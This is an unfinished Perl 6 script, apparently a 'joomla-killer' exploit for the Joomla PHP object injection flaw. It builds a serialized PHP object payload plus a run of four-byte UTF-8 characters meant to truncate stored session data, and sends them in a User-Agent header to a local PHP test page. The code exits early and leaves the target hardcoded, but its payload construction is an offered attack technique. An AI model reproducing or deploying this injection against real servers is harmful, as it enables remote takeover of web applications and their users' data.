#!/usr/local/bin/perl6
use v6;

# パラメータを受けるときは先頭に：をつける。
# つけない場合はファイル扱いになる。
# ！は必須パラメータ
sub MAIN($url!, Bool :$print = False) {
  my Int $port = 80;
  my $utf8char = <131083 135741 135963 136302 137405 134047 136884 138804 143812 144836 145215 145251 146686 149489 152718 152846 153457 154052 155041 158463 159296 159988 161412 164471 164813 172432 131209 131234 131236 131490 131603 131883 131969 131953 132089 132170 132361 132566 132648 132943 133127 133178 133305 133500 133533 133843 133917 134469 134625 134805>.chrs.encode;
  my $injection_str = '_hackedByPerl6|O:6:"Class1":1:{s:15:"%00Class1%00private";s:3:"prv";}';

  $url.say;
  $print.say;

  (my $schema, my $host) = $url.split('/',:skip-empty);
  $host.say;
  if $host ~~ /\:/ {
    ($host, my $port_str) = $host.split(':',:skip-empty);
    my $e;
    {
      $port = $port_str.Int;
      if $port < 1 || $port > 65535  { die "invalid port number. it is between 1 to 65535"; }
      CATCH {
        default {
          $e = $_;
        }
      }
    }
    if $e {
      err($e);
      exit(1);
    }
  }
  $host.say;
  $port.say;

  exit;
  #===========#
  #  get cmd  #
  #===========#
  my $cmd_str = getCmd();
  $cmd_str.say;

  my $conn = IO::Socket::INET.new(:host<localhost>, :port(80), :familly(2), :encoding('utf-8'), :nl-in("\r\n"));
  $conn.print: "GET /phptest/phptest.php HTTP/1.1\n";
  $conn.print: "Host: localhost\n";
  $conn.print: "User-Agent: " ~ $injection_str ~ $utf8char.decode ~ "\n";
  $conn.print: "Connection: close\n";
  $conn.print: "\n";
  say $conn.recv;
  $conn.close;
  #say @*ARGS.perl;

}
#===========#
#    SUB    #
#===========#
sub getCmd() {
  "<joomla-killer-Perl6!>\$ ".print;
   return get().chomp;
}

sub err($mess) {
  print "[error] " ~ $mess ~ "\n";
}

